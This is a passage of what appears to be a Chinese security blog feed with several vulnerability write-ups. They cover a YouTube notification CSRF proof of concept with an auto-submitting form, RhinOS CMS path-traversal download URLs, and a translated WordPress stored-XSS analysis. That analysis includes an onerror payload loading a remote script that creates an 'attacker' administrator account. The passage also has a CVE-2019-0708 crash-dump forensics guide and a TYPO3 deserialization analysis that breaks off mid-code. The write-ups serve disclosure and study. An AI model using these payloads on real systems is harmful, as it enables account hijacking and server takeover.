title="构造CSRF攻击框架​"></a>构造CSRF攻击框架​</h3><p>到了这一步，从这些参数里，我隐约觉得这里应该会有漏洞出现，但总要构造个PoC出来试试看。因此，通过研究以上参数的生成机制，我利用sw.js原理，编写了以下三个代码文件，构建了一个本地服务端来生成其中的各个参数。 </p><p><strong>index.html:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Push Demo&lt;/title&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;index.css&quot; /&gt;</span><br><span class="line">    &lt;script src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">    &lt;button id=&quot;permission-btn&quot; onclick=&quot;main()&quot;&gt;Ask Permission&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">index.js：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const check = () =&gt; &#123;</span><br><span class="line">  if (!(&apos;serviceWorker&apos; in navigator)) &#123;</span><br><span class="line">    throw new Error(&apos;No Service Worker support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  if (!(&apos;PushManager&apos; in window)) &#123;</span><br><span class="line">    throw new Error(&apos;No Push API Support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const registerServiceWorker = async () =&gt; &#123;</span><br><span class="line">  const swRegistration = await navigator.serviceWorker.register(&apos;sw.js&apos;)</span><br><span class="line">  return swRegistration</span><br><span class="line">&#125;</span><br><span class="line">const requestNotificationPermission = async () =&gt; &#123;</span><br><span class="line">  const permission = await window.Notification.requestPermission()</span><br><span class="line">  if (permission !== &apos;granted&apos;) &#123;</span><br><span class="line">    throw new Error(&apos;Permission not granted for Notification&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const main = async () =&gt; &#123;</span><br><span class="line">  check()</span><br><span class="line">  const swRegistration = await registerServiceWorker()</span><br><span class="line">  const permission = await requestNotificationPermission()</span><br><span class="line">&#125;</span><br><span class="line">sw.js：</span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;activate&apos;, async () =&gt; &#123;   console.log(&quot;Hello&quot;);</span><br><span class="line">      self.registration.pushManager.subscribe()</span><br><span class="line">  .then(function(subscription) &#123;</span><br><span class="line">          console.log(JSON.stringify(subscription));</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function(e) &#123;</span><br><span class="line">    console.log(e);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(&quot;push&quot;, function(event) &#123;</span><br><span class="line">  if (event.data) &#123;</span><br><span class="line">    console.log(&quot;Push event!! &quot;, event.data.text());</span><br><span class="line">    showLocalNotification(&quot;Yolo&quot;, event.data.text(),  self.registration);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&quot;Push event but no data&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">const showLocalNotification = (title, body, swRegistration) =&gt; &#123;</span><br><span class="line">  const options = &#123;</span><br><span class="line">    body</span><br><span class="line">    // here you can add more properties like icon, image, vibrate, etc.</span><br><span class="line">  &#125;;</span><br><span class="line">  swRegistration.showNotification(title, options);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这三个代码文件的目的在于获取sw.js请求时生成的各个参数，有了这些参数，就可以间接形成通知（Notification），打开其中的index.html页面，点击Ask Permission按钮请求通知权限，后台调用sw.js脚本，通过内置的Firefox API形成一个本地的通知服务端，通知请求提交时，我们就能获取到其中的各个参数。利用这些参数，可以进一步构造出CSRF攻击框架，就能获取到对应的通知消息。<br>在本地loclalhost构造这种通知请求服务端，需要用到Service Worker 服务工作线程（sw.js）的部署原理，其中涉及服务注册、激活、缓存控制和相关响应机制，具体可参考：developer.mozilla.org和developers.google.com中的详细介绍说明。</p><p><img src="http://zone.secevery.com/uploads/article/20190428/44a3ae0150b0efc2c8dd3d2f34a4a035.png" alt></p><p>综合上述分析，基于我们之前创建的本地通知服务端，结合Youtube的通知请求提交方式，我构造了以下CSRF攻击框架：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.youtube.com/notifications_ajax?action_register_device=1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;csrf&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;device_id&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;permission&quot; value=&quot;granted&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;endpoint&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;p256dh_key&quot; value=&quot;replace=&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;auth_key&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;document.csrf.submit();&lt;/script&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>让我意想不到的是，我在其中以其他Youtube账号身份，利用获取到的各种请求参数，提交了通知请求，竟然能有效实施通知消息的CSRF攻击。也就是说，我们现在可以劫持到其他Youtube账号的消息推送接口（PUSH webhook），以其他Youtube账号身份收取到Youtube响应该账号的相关通知，这些通知可能是他订阅的某个频道或视频的更新消息，也可能是他私人视频的观众评论等，如下：</p><p><img src="http://zone.secevery.com/uploads/article/20190428/0131bb86ac1e5fa9eaa19bafbab8c677.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/%E7%8A%80%E7%89%9B(RhinOS)CMS3.X%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CVE-2018-18760)/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/%E7%8A%80%E7%89%9B(RhinOS)CMS3.X%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CVE-2018-18760)/</url>
      
        <content type="html"><![CDATA[<h2 id="01简介"><a href="#01简介" class="headerlink" title="01简介"></a>01简介</h2><p>RhinOS是一个使用最新功能开发网站的框架，可以为Web门户提供最快的访问和管理。RhinOSCMS对于网站管理功能十分强劲，内置允许使用数据库进程和解析器模块快速访问数据库，xml和其他资源，购物车，标签和参数化文件，配置参数，Intranet访问，数据库会话，电子邮件发送，验证码安全系统，快速过滤，列表和详细信息的模块，功能可谓是非常之多了。RhinOSCMS的download.php文件存在任意文件下载漏洞，通过漏洞能够下载任意的文件。</p><h2 id="02环境搭建"><a href="#02环境搭建" class="headerlink" title="02环境搭建"></a>02环境搭建</h2><p>RhinOS CMS下载地址为：<a href="https://sourceforge.net/projects/rhinos/。下载完成后，打开文件，一直点下一步就能够完成安装，如图1所示。" target="_blank" rel="noopener">https://sourceforge.net/projects/rhinos/。下载完成后，打开文件，一直点下一步就能够完成安装，如图1所示。</a></p><p><img src="https://pic3.zhimg.com/v2-db2e62b8afcecde12a1a92d999bf817e_r.jpg" alt></p><p>图1完成安装</p><p>由于一些编码原因，安装成功后的的信息会显示一些乱码，如果使用西班牙语的系统就能正常显示了。然后需要将httpd.conf中的端口修改为8080端口，修改端口是为了避免和WINDOWS本身一些服务冲突，http.conf所在路径为：C:\rhinos\httpd\conf\httpd.conf。如图2所示。</p><p><img src="https://pic1.zhimg.com/v2-fbaf714d0454c7874b0043bba8dfd1b8_r.jpg" alt></p><p>图2httpd.conf所在路径</p><p>右键编辑将文件中的80端口修改为8080端口，如图3所示。</p><p><img src="https://pic2.zhimg.com/v2-ea92189b90a709947773a0c041e042c5_r.jpg" alt></p><p>图3修改端口</p><p>修改端口后需要重启阿帕奇服务，重启服务后访问<a href="http://127.0.0.1:8080。就能够访问到已经搭建好的CMS了，如图4所示。" target="_blank" rel="noopener">http://127.0.0.1:8080。就能够访问到已经搭建好的CMS了，如图4所示。</a></p><p><img src="https://pic4.zhimg.com/80/v2-0902d18ccba9d23b28d2be02e9f374f3_hd.jpg" alt></p><p>图4重启apache服务后访问</p><h2 id="03漏洞代码审计"><a href="#03漏洞代码审计" class="headerlink" title="03漏洞代码审计"></a>03漏洞代码审计</h2><p>漏洞存在于C:\rhinos\demo\admin\php\download.php中，在第30行代码，能够看到文件读取的路径拼接操作，如图5所示。</p><p><img src="https://pic1.zhimg.com/v2-7e723ece58ccea364a50eb6ffe8913f4_r.jpg" alt></p><p>图5download.php</p><p>看到getParam()，查找这个方法是如何实现的。<br>这个函数存在于：C:\rhinos\demo\admin\php\connect.php。第88行，如图6所示。</p><p><img src="https://pic2.zhimg.com/v2-f1f16f289aba167af53da72aebd65729_r.jpg" alt></p><p>图6connect.php</p><p>这个函数中获取了”file”的参数，通过POST或者GET提交都是可以的。然后根据图5所示第41行触发文件读取操作，如果控制参数file则能够成为任意文件读取漏洞或者为任意文件下载漏洞。</p><h2 id="04漏洞复现"><a href="#04漏洞复现" class="headerlink" title="04漏洞复现"></a>04漏洞复现</h2><p>在复现之前需要找到从什么地方调用到了download.php,在经过测试之后发现通过这个URL提交就能够利用漏洞下载到config.php文件,但是首先需要登录后台。URL如下:<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../config.php，如图7所示。" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../config.php，如图7所示。</a></p><p><img src="https://pic3.zhimg.com/v2-18183c286be55b1b067a55f89ca4deaa_r.jpg" alt></p><p>图7下载config.php</p><p>当然既然是任意文件下来漏洞肯定可以下载windows目录下面的win.ini文件，使用URL为:<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../../../../Windows/win.ini。执行后就能够下载文件了。如图8所示。" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../../../../Windows/win.ini。执行后就能够下载文件了。如图8所示。</a></p><p><img src="https://pic4.zhimg.com/v2-fddb74e5019196975e2663db99b48ff3_r.jpg" alt></p><p>图8下载win.ini</p><p>##05修复建议<br>根据前文的描述能够看出，漏洞存在一定的危害。应该对于漏洞进行修复，关于如何去修复漏洞。</p><p>1.过滤点[.]要求用户在url中不能回溯上级目录。<br>2.正则严格判断用户输入参数的格式，保证输入参数的准确性。<br>3.将下载区独立放在项目路径外，分配每个下载资源固定的URL,不能是所有的下载资源都是统一的URL：<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=文件名" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=文件名</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WordPress存储型XSS漏洞分析</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/WordPress%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/WordPress%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><strong>译文声明<br>本文是翻译文章，文章原作者fortinet，文章来源：fortinet.com<br>原文地址：<a href="https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html</a><br>译文仅供参考，具体内容表达以及含义原文为准</strong></p><p><img src="https://p3.ssl.qhimg.com/t0154214347380ba2a2.png" alt> </p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>WordPress是世界上最流行的CMS（内容管理系统），占据全球60.4%的市场份额，这个数字远远高于第二名的Joomla!（5.2%的市场份额）。因此，在互联网上有超过三分之一的网站采用WordPress构建。</p><p>FortiGuard Labs团队最近在WordPress中发现了一个存储型XSS（Cross-Site Scripting）0day漏洞，这个XSS漏洞位于WordPress 5.0新增的Gutenberg编辑器中，该编辑器无法正确过滤Shortcode（短代码）错误消息中的JavaScript/HTML代码。如果远程攻击者具备Contributor（贡献者）或者更高权限，当受害者访问被攻击的网页时，攻击者就可以在受害者浏览器上下文中执行任意JavaScript/HTML代码。如果受害者具备更高权限（比如管理员权限），攻击者甚至可以攻破整个web服务器。</p><p>这个存储型XSS漏洞影响5.0至5.2.2版的WordPress。</p><h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>在WordPress 5.0中，用户可以在文章（post）中添加Shortcode块（block）。当在Shortcode块中添加特定的HTML编码字符（比如&lt;）然后重新打开该文章时，WordPress就会显示一个错误消息，将&lt;解码成&lt;然后展示预览。</p><p><img src="https://p5.ssl.qhimg.com/t018c8ac1b86a6e22ac.png" alt><br>图1. 在Shortcode块中插入HTML编码字符</p><p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>图2. Shortcode错误消息预览</p><p>我们可以使用<strong>“&gt;&lt;img src=1 onerror=prompt(1)&gt;</strong>这段PoC代码轻松绕过预览视图中的XSS过滤器。</p><p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>图3. 将PoC代码插入Shortcode块</p><p>当受害者查看该文章时，就会在浏览器中执行XSS代码。</p><p><img src="https://p3.ssl.qhimg.com/t010226398ebf02fdd8.png" alt><br>图4. WordPress Shortcode预览XSS</p><p>如果受害者刚好具备管理员权限，那么攻击者就可以利用该漏洞来获取管理员账户的控制权，利用WordPress内置的函数拿到shell，进一步控制整个服务器。</p><p>比如，攻击者可以在自己的web服务器上托管一个JavaScript文件（这里以wpaddadmin.js为例），这段JavaScript代码会添加一个WordPress管理员账户，用户名为attack，密码为attack。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Send a GET request to the URL &apos;/wordpress/wp-admin/user-new.php&apos;, and extract the current &apos;nonce&apos; value  </span><br><span class="line">var ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">var requestURL = &quot;/wordpress/wp-admin/user-new.php&quot;;  </span><br><span class="line">var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;  </span><br><span class="line">ajaxRequest.open(&quot;GET&quot;, requestURL, false);  </span><br><span class="line">ajaxRequest.send();  </span><br><span class="line">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  </span><br><span class="line">var nonce = nonceMatch[1];  </span><br><span class="line"></span><br><span class="line">// Construct a POST query, using the previously extracted &apos;nonce&apos; value, and create a new user with an arbitrary username / password, as an Administrator  </span><br><span class="line">var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;;  </span><br><span class="line">ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">ajaxRequest.open(&quot;POST&quot;, requestURL, true);  </span><br><span class="line">ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);  </span><br><span class="line">ajaxRequest.send(params);</span><br></pre></td></tr></table></figure><p>然后攻击者可以使用如下PoC来插入JavaScript。</p><p><code>&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;javascript&amp;colon;(function () { var url = &#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;;if (typeof beef == &#39;undefined&#39;) { var bf = document.createElement(&#39;script&#39;); bf.type = &#39;text/javascript&#39;; bf.src = url; document.body.appendChild(bf);}})();&quot;&amp;gt;</code><br><img src="https://p3.ssl.qhimg.com/t01ff29771459e602b0.png" alt><br>图5. 插入XSS代码以添加管理员账户</p><p>一旦具备高权限的受害者查看该文章，就会创建attacker管理员账户。<br><img src="https://p4.ssl.qhimg.com/t010e42abaa7fcc8d89.png" alt><br>图6. 执行XSS代码</p><p><img src="https://p4.ssl.qhimg.com/t013e0fbc54e4f4a6c4.png" alt><br>图7. XSS代码成功创建具备管理员权限的attacker账户</p><p>随后攻击者可以修改已有的php文件，改成webshell代码，以便接管目标web服务器。</p><p><img src="https://p0.ssl.qhimg.com/t0131da4b3ea2ca7c86.png" alt></p><p>图8. 使用攻击者账户添加webshell</p><p><img src="https://p1.ssl.qhimg.com/t01c0b5cda440e3cf4b.png" alt><br>图9. 控制web服务器</p><h2 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h2><p>FortiGuard Labs向WordPress反馈了这个0day漏洞，官方很快发布了相应补丁。如果大家正在使用存在漏洞的WordPress版本，请尽快升级到最新版，或者及时打上补丁。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单判断是否是cve-2019-0708攻击</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/cve-20190-0708/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/cve-20190-0708/</url>
      
        <content type="html"><![CDATA[<p>文章转自<a href="https://mp.weixin.qq.com/s?__biz=MzA4NjQxMDcxNA==&amp;mid=2709352684&amp;idx=1&amp;sn=0e845ce5ee2c7f210d89e1566b39e0e5" title="中国白客联盟" target="_blank" rel="noopener">中国白客联盟</a></p><hr><p>今早一起床，发现cve-2019-0708 exp已经公开。但是作为安服人员，攻击是一回事，应急又是另一大回事。这里就简单来判断受害者机器是否受到了cve-2019-0708攻击。</p><p>因为cve-2019-0708这类是溢出类攻击，所以跟ms17-010、ms12-020一样，有一定的几率把机器打蓝屏，这里以蓝屏文件为例作为分析。</p><p>首先安装windbg，添加符号表<br><img src="https://tva1.sinaimg.cn/large/005R6Otmly1g6tf36icqcj30nd08mq53.jpg" alt><br><code>set _NT_SYMBOL_PATH=srv*DownstreamStore*https://msdl.microsoft.com/download/symbols</code><br>打开蓝屏文件，我的win7默认在<br><code>C:\Windows\Minidump</code></p><p>首先我利用cve-2019-0708把我机器打蓝屏，打开该蓝屏dmp文件，关注debug session time、system uptime，可以看到该机器运行了4分钟，在10:00左右出现蓝屏事件：<br><img src="https://ws3.sinaimg.cn/large/005R6Otmly1g6tf36pi9wj30mu05g767.jpg" alt><br>输入</p><p><code>!analyze -v</code><br>看到蓝屏代码<br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf36v2gpj30o302y0tc.jpg" alt><br>蓝屏代码造成原因：</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37055uj30mn01kt90.jpg" alt></p><p>关注PROCESS_NAME，代表导致系统蓝屏的进程：</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37fasyj30nh05vwfy.jpg" alt></p><p>FOLLOWUP_IP，错误指令位置</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37md3jj30o704faas.jpg" alt></p><p>查看出错驱动，rdpwd.sys，可以通过网上搜索对应漏洞分析文章，查看对用的驱动是否受影响<br><code>lmvm RDPWD</code><br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf38grlmj30ns07mq6d.jpg" alt></p><p>这是ms12-020打的</p><p><img src="https://ws1.sinaimg.cn/large/005R6Otmly1g6tf38ol3sj30n9024wfc.jpg" alt></p><p>这是ms17-010打的<br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf38vddfj30mx05ygmg.jpg" alt></p><p>可见不同的攻击手法得到的蓝屏文件结果不一样的，因此可以通过分析蓝屏文件来判断是否受到了哪种攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-12747：TYPO3 9.5.7 RCE漏洞分析</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/CVE-2019-12747%EF%BC%9ATYPO3%209.5.7%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/CVE-2019-12747%EF%BC%9ATYPO3%209.5.7%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><strong>译文声明:<br>本文是翻译文章，文章原作者ripstech，文章来源：blog.ripstech.com<br>原文地址：<a href="https://blog.ripstech.com/2019/typo3-overriding-the-database" target="_blank" rel="noopener">https://blog.ripstech.com/2019/typo3-overriding-the-database</a><br>译文仅供参考，具体内容表达以及含义原文为准</strong><br><img src="https://p2.ssl.qhimg.com/t01cb51d1cb54b0010f.png" alt></p><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>在本文中，我们研究TYPO3 CMS的核心中的一个关键漏洞，该漏洞通过代码审计挖掘而出。该漏洞使得经过身份验证的用户能够在底层系统上执行任意PHP代码。</p><p>受该漏洞影响的版本是TYPO3 8.x到8.7.26，以及TYPO3 9.x到9.5.7。对不可信数据的反序列化会导致远程代码执行漏洞，该漏洞可以与后端中检测到的跨站脚本漏洞(CVE-2019-12748)相结合。</p><p>RIP扫描报告（<a href="https://demo.ripstech.com/scan/109/165）" target="_blank" rel="noopener">https://demo.ripstech.com/scan/109/165）</a></p><h2 id="0x02-使用payload覆盖数据库"><a href="#0x02-使用payload覆盖数据库" class="headerlink" title="0x02 使用payload覆盖数据库"></a>0x02 使用payload覆盖数据库</h2><p>在TYPO3的后端部分保存任何表单时将会发生此漏洞。例如，如果用户修改了pages部分，则可以从TYPO3的SQL数据库中提取要编辑的数据并将其写回数据库。在从数据库获取数据之后，应用逻辑允许通过用户的输入覆盖所获取数据的单列。此特征允许经过身份验证的恶意后端用户覆盖包含序列化数据的数据库值，这些数据稍后会反序列化。这将会导致PHP对象注入，最终攻击者可以远程执行代码（CVE-2019-12747）。</p><p>攻击视频（<a href="https://blog.ripstech.com/videos/typo3_957.mp4）" target="_blank" rel="noopener">https://blog.ripstech.com/videos/typo3_957.mp4）</a></p><h2 id="0x03-技术细节"><a href="#0x03-技术细节" class="headerlink" title="0x03 技术细节"></a>0x03 技术细节</h2><p>在TYPO3中保存后端表单时，将调用$formDataCompiler对象的compile()方法。参数是一个使用用户输入填充的数组，如下第8行所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typo3/sysext/backend/Classes/Controller/EditDocumentController.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">  $this-&gt;overrideVals = $parsedBody[&apos;overrideVals&apos;] ?? </span><br><span class="line">    $queryParams[&apos;overrideVals&apos;] ?? null;</span><br><span class="line">  // ... </span><br><span class="line">  $formDataCompilerInput[&apos;overrideValues&apos;] = $this-&gt;overrideVals[$table];</span><br><span class="line">  $formData = $formDataCompiler-&gt;compile($formDataCompilerInput);</span><br></pre></td></tr></table></figure><p>该方法使用for-loop遍历一个有序的FormDataProvider对象列表，并按顺序在每个$provider对象上调用addData()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typo3/sysext/backend/Classes/Form/FormDataGroup/OrderedProviderList.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">public function compile(array $result): array</span><br><span class="line">&#123;</span><br><span class="line">  // ...</span><br><span class="line">  foreach ($orderedDataProvider as $providerClassName =&gt; $providerConfig) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    $result = $provider-&gt;addData($result);</span><br><span class="line">  &#125;</span><br><span class="line">  return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码的第9行，$provider-&gt;addData()的参数$result在下面的addData()方法调用作为其参数。在每次迭代时，变量$result表示数组在$provider处理完其内容后被修改。其中一个providers是DatabaseRecordOverrideValues类的一个实例，该类允许覆盖从数组$result中提取的数据，其中数组的行列值分别为databaseRow和任意key值。</p><p>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseRecordOverrideValues.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function addData(array $result)</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($result[&apos;overrideValues&apos;] as $fieldName =&gt; $fieldValue) &#123;</span><br><span class="line">        if (isset($result[&apos;processedTca&apos;][&apos;columns&apos;][$fieldName])) &#123;</span><br><span class="line">            $result[&apos;databaseRow&apos;][$fieldName] = $fieldValue;</span><br><span class="line">            // ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，下列FormDataProvider对象之一实现了unserialize()方法对被覆盖数据的调用，从而导致漏洞：</p><p>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseLanguageRows.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function addData(array $result)</span><br><span class="line">&#123;</span><br><span class="line">  // ...</span><br><span class="line">  if (/*...*/) </span><br><span class="line">  &#123;</span><br><span class="line">    $result[&apos;defaultLanguageDiffRow&apos;][$defaultLanguageKey] = unserialize(</span><br><span class="line">        